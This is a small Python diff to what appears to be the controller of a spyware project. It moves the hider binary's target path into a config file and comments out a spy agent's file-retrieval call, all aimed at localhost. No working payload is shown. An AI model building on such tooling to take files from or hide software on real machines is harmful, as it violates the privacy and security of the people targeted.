@@ -4,6 +4,7 @@ from command import Command
 from responce import Responce
 from funCode import FunCode
 from time import sleep
+import configparser
 
 HOST = "localhost"
 PORT_MANEGER = 65432
@@ -18,12 +19,15 @@ def clean():
 
 
 def main():
+    config = configparser.ConfigParser()
+    config.read('config.ini')
 
-    targetHiderPath = "./sentHider.o"
-
+    targetHiderPath = config['hider']['target_path']
+    
+    """
     spyAgent = Agent(HOST, PORT_SPYWARE)
     print(spyAgent.retrieve_file("fishfish.txt"))
-
+    """
     # print(spyAgent.hider_setup(targetHiderPath))
 
 
